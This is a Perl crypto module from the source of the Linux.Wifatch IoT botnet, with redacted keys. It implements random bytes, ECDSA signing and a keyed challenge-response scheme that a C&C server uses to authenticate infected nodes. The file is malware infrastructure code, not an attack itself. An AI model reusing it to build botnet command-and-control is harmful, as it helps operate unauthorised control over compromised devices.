#
# This file is part of Linux.Wifatch
#
# Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
#
# Linux.Wifatch is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Linux.Wifatch is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
#

package bm::crypto;

use strict;

use Digest::SHA       ();
use Digest::KeccakOld ();
use Crypt::PK::ECC    ();
use Crypt::Rijndael   ();

my $prngc;
my $prngi = 0;
my $prngb = "";

{
	open my $fh, "</dev/urandom";
	sysread $fh, my $buf, 32;
	$prngc = new Crypt::Rijndael $buf, Crypt::Rijndael::MODE_ECB
}

sub randbytes($)
{
	$prngb .= $prngc->encrypt(pack "x8 P", ++$prngi) while $_[0] > length $prngb;

	substr $prngb, 0, $_[0], "";
}

my $pk = new Crypt::PK::ECC \(pack "H*", 'not-the-real-ecdsa-key');

sub ecdsa_sign($)
{
	my ($m) = @_;

	my ($r, $s) = unpack "xx x C/a x C/a", $pk->sign_hash(Digest::SHA::sha256 $m);

	scalar reverse pack "a32 a32", (scalar reverse $s), (scalar reverse $r);
}

my $TNKEY_FIXED = pack "H*", "not-the-real-secret";
my $TNKEY_NODE  = pack "H*", "not-the-real-secret";
my $TNKEY_TYPE  = pack "H*", "not-the-real-secret";

# tn's out there have an id and shared secret that
# is unique to each one. the challenge response protocol works
# by sending a random 32 byte string, the id,
# and expects keccak(challange . id . secret)
# server needs to know the secret.
#
# this can be accomplished in a variety of ways
# the secret can be in the database, or it can be
# derived from the id, using a secret key:
# keccak($KEY_FIXED . keccak(secret . $KEY_FIXED))
# the key, obviously, is only known to the c&c server
# the tn component receives the resulting secret as commandline argument
#
# the first byte of keccak(id . $KEY_TYPE) also encodes a type
# 1 - serinfect, infect
# 2 - tnr upgraded
# 3 - tncmd

sub tn_gensecret($)
{
	my ($id) = @_;

	$id = Digest::KeccakOld::sha3_256 $id . $TNKEY_FIXED;
	$id = Digest::KeccakOld::sha3_256 $TNKEY_FIXED . $id;

	$id
}

sub tn_gencreds(;$)
{
	my ($type) = @_;

	my $id0 = bm::crypto::randbytes 32;
	my $c;

	while () {
		my $id = $id0 ^ pack "N", $c;

		return ($id, tn_gensecret $id)
			if $type == ord Digest::KeccakOld::sha3_256 $id . $TNKEY_TYPE;

		++$c;
	}
}

# get secret for id
sub tn_secret($)
{
	my ($id) = @_;

	my ($key, $secret);

	#	if (defined (my $secret1 = sql_fetch "select secret1 from node where id = ?", $id)) {
	#		$key = $TNKEY_NODE;
	#		$secret = $secret1;
	#	} else {
	$key    = $TNKEY_FIXED;
	$secret = $id;

	#	}

	$secret = Digest::KeccakOld::sha3_256 $secret . $key;
	$secret = Digest::KeccakOld::sha3_256 $key . $secret;

	$secret
}

sub tn_response
{
	my ($id, $chg) = @_;

	my $secret = tn_secret $id;
	Digest::KeccakOld::sha3_256 "$chg$id$secret";
}

1

